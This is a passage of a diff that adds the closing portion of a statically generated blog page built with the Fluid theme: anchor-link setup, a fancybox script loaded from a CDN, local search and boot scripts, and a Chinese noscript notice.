+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
